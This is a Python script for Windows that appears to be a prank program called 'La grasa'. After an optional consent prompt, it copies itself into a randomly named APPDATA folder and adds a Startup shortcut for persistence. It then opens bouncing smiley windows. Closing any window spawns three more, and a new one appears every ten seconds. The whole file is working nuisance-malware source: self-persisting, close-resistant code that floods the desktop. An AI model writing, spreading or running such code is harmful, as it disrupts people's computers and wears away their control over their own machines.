import os
import sys
import shutil
import ctypes
import random
import tkinter as tk
import tkinter.messagebox as messagebox
import win32com.client  # pip install pywin32

def add_to_startup():
    appdata_path = os.getenv("APPDATA")
    target_folder = os.path.join(appdata_path, "GrasaRandom_" + str(random.randint(1000, 9999)))
    os.makedirs(target_folder, exist_ok=True)

    script_path = os.path.abspath(sys.argv[0])
    new_script_path = os.path.join(target_folder, os.path.basename(script_path))

    if script_path != new_script_path:
        shutil.copy(script_path, new_script_path)

    startup_path = os.path.join(appdata_path, "Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut_path = os.path.join(startup_path, "LaGrasa.lnk")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{new_script_path}"'
    shortcut.WorkingDirectory = target_folder
    shortcut.IconLocation = sys.executable
    shortcut.save()

def ask_user_consent():
    root = tk.Tk()
    root.withdraw()
    result = messagebox.askyesno("Permiso", "¿Quieres que esta app se abra al iniciar Windows?")
    root.destroy()
    if result:
        add_to_startup()

if __name__ == "__main__":
    ask_user_consent()

    class BouncingWindow:
        instances = []

        def __init__(self, master=None, x=None, y=None):
            self.master = master if master else tk.Tk()
            self.master.title("La grasa")
            self.master.protocol("WM_DELETE_WINDOW", self.on_closing)

            self.width = 200
            self.height = 100

            screen_width = self.master.winfo_screenwidth()
            screen_height = self.master.winfo_screenheight()

            if x is None or y is None:
                x = random.randint(0, screen_width - self.width)
                y = random.randint(0, screen_height - self.height)

            self.master.geometry(f"{self.width}x{self.height}+{x}+{y}")

            label = tk.Label(self.master, text="☺", font=("Comic Sans", 50))
            label.pack(expand=True)

            self.dx = random.choice([-5, 5])
            self.dy = random.choice([-5, 5])

            self.speed = 50

            BouncingWindow.instances.append(self)

            self.move_window()

            if len(BouncingWindow.instances) == 1:
                self.spawn_new_window_every_10s()

            self.master.mainloop()

        def move_window(self):
            x = self.master.winfo_x()
            y = self.master.winfo_y()

            screen_width = self.master.winfo_screenwidth()
            screen_height = self.master.winfo_screenheight()

            if x + self.dx < 0 or x + self.width + self.dx > screen_width:
                self.dx = -self.dx
            if y + self.dy < 0 or y + self.height + self.dy > screen_height:
                self.dy = -self.dy

            self.master.geometry(f"+{x + self.dx}+{y + self.dy}")

            self.speed = max(10, self.speed - 0.1)
            self.master.after(int(self.speed), self.move_window)

        def on_closing(self):
            BouncingWindow()
            BouncingWindow()
            BouncingWindow()
            self.master.destroy()

        def spawn_new_window_every_10s(self):
            def create_window():
                BouncingWindow()
                BouncingWindow.instances[0].master.after(10000, create_window)

            self.master.after(10000, create_window)

    BouncingWindow()
